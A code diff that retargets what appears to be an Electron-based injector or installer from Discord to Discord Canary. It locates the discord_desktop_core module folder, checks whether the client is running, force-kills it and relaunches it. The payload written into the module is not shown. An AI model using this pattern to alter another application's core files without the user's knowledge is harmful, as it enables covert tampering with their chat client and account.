@@ -37,7 +37,7 @@ window.onload = async () => {
     });
 
     let getLastDiscordVersion = () => {
-        const files = fs.readdirSync(process.env.LOCALAPPDATA + '\\Discord');
+        const files = fs.readdirSync(process.env.LOCALAPPDATA + '\\discordcanary');
         let output = '0';
 
         for (let file of files) {
@@ -51,7 +51,7 @@ window.onload = async () => {
 
     getLastDiscordVersion();
 
-    const discord = process.env.LOCALAPPDATA + '\\Discord\\' + getLastDiscordVersion() + '\\modules\\discord_desktop_core-1\\discord_desktop_core\\';
+    const discord = process.env.LOCALAPPDATA + '\\discordcanary\\' + getLastDiscordVersion() + '\\modules\\discord_desktop_core-1\\discord_desktop_core\\';
 
     const net = require('net');
 
@@ -77,7 +77,7 @@ window.onload = async () => {
     function discordIsOpen() {
         return new Promise((res, err) => {
             exec('tasklist', (err, stdout, stderr) => {
-                res(stdout.toLowerCase().includes('discord.exe'));
+                res(stdout.toLowerCase().includes('discordcanary.exe'));
             });
         });
     }
@@ -402,7 +402,7 @@ window.onload = async () => {
 
     async function killDiscord() {
         return new Promise((res, err) => {
-            exec('taskkill /f /im discord.exe', () => {
+            exec('taskkill /f /im discordcanary.exe', () => {
                 res(true);
             });
         });
@@ -410,7 +410,7 @@ window.onload = async () => {
 
     async function launchDiscord() {
         return new Promise((res, err) => {
-            exec(process.env.LOCALAPPDATA + '\\Discord\\Update.exe --processStart Discord.exe', () => {
+            exec(process.env.LOCALAPPDATA + '\\discordcanary\\Update.exe --processStart discordcanary.exe', () => {
                 res(true);
             });
         });
